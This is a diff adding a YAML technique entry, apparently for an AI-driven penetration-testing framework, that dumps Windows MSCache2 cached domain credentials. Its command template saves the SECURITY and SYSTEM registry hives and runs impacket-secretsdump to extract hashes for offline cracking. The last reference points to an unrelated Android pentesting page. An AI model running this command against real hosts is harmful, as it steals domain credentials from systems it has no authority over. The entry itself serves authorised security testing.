@@ -1,0 +1,32 @@
+name: mscache2_dump
+category: creds
+description: Dump MSCache2 (Domain Cached Credentials v2) from registry on any domain
+  host
+preconditions:
+- shell_obtained
+- is_local_admin
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: reg save HKLM\SECURITY C:\\Windows\\Temp\\security.save /y & reg
+  save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y && impacket-secretsdump -system
+  system.save -security security.save LOCAL
+parser: impacket_parser
+expected_effects:
+- mscache2_hashes_obtained
+- offline_crack_seed
+- has_hash
+falsifier:
+  pattern: ACCESS_DENIED|file not found|no cached logons
+  timeout: 60
+model_tier: haiku
+mechanism: 'Windows caches the last 10 (by default) interactive domain logons as MSCache2
+
+  (hashcat mode 2100). Found in HKLM\\SECURITY\\Cache. Useful on non-DCs where
+
+  dcsync/ntds.dit isn''t accessible. Offline crack only — no pass-the-cache.
+
+  '
+references:
+  ocd_mindmap: 'Branch 10: MSCache2 cached creds'
+  hacktricks: windows-hardening/stealing-credentials/
+hacktricks_ref: mobile-pentesting/android-app-pentesting/frida-tutorial/objection-tutorial.md
